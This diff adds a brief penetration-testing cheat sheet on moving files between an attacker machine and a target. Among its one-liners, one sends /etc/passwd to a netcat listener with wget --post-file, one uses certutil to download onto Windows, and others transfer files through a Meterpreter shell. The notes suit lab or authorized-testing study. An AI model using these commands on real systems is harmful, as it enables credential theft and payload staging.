@@ -1,0 +1,42 @@
+i. File Transfers
+
+Linux
+
+	Set up own web server
+	python -m SimpleHTTPServer 80
+	python3 -m http.server 80
+
+	wget http://domain.com/file.ext
+
+
+	Set up own ftp server
+	python -m pyftpdlib -p 21 -w
+	python3 -m pyftpdlib -p 21 -w
+
+
+	Set up netcat listener
+	Nc -nvlp 4444
+
+	wget --post-file=/etc/passwd 192.168.202.128:4444
+
+
+Windows
+
+	HTTP
+	host files on attacker machine web server
+
+	certutil -urlcache -f http://domain.com/file.txt
+	May be blocked by Windows Defender
+
+
+	FTP
+	Set up FTP server on attacker machine
+
+	ftp attackermachineIP
+
+
+	Metasploit - in meterpreter shell 
+	upload /Downloads/file.txt
+	download c:\\file.txt file.txt
+	NOTE: need to escape \ in meterpreter 
+
